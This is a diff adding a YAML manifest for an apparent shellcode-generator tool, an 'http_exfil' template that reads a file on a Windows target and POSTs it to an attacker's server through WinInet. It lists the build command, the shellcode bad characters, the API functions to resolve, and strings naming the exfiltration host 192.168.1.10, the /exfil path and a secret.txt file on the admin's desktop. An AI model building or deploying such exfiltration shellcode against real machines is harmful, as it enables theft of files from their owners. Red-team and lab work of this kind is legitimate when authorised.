@@ -1,0 +1,61 @@
+template: http_exfil
+# HTTP POST exfiltration via WinInet.
+# Reads a file from the target, POSTs its contents to the attacker's
+# HTTP server.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/http_exfil.yaml \
+#       --src "C:\Users\admin\Desktop\secret.txt" \
+#       --url "http://192.168.1.10:8000/exfil" \
+#       --payload-file secret.txt --out emitter_out/
+#
+# Catch the POST:
+#   python3 Tools/http_exfil_server.py --port 8000
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - InternetOpenA
+  - InternetConnectA
+  - HttpOpenRequestA
+  - HttpSendRequestA
+  - InternetCloseHandle
+  - VirtualAlloc
+  - CreateFileA
+  - ReadFile
+  - CloseHandle
+  - ExitProcess
+
+variables:
+  - inet_session
+  - inet_connect
+  - inet_request
+  - file_handle
+  - virt_buf
+  - bytes_read
+  - bytes_total
+
+strings:
+  - label: wininet_dll
+    value: wininet.dll
+    method: push
+  - label: user_agent
+    value: Mozilla/5.0
+    method: mov
+    dest: edi
+  - label: exfil_host
+    value: "192.168.1.10"
+    method: mov
+    dest: edi
+  - label: url_path
+    value: "/exfil"
+    method: mov
+    dest: edi
+  - label: http_post
+    value: POST
+    method: mov
+    dest: edi
+  - label: src_path
+    value: "C:\\Users\\admin\\Desktop\\secret.txt"
+    method: mov
+    dest: edi
